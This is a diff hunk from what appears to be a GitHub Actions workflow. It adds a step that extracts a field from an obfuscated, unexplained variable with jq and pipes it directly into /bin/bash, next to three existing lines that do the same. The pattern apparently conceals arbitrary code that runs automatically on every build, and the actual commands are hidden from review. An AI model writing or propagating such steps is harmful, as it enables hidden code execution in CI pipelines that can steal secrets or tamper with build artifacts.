@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$tlm150" | jq -r .phrz061 | /bin/bash
           echo $fr9723 | jq -r .cdi1 | /bin/bash
           printf '%s' "$f8" | jq -r .fo55 | /bin/bash
+          printf '%s' "$qyyo99" | jq -r .lqt01065 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
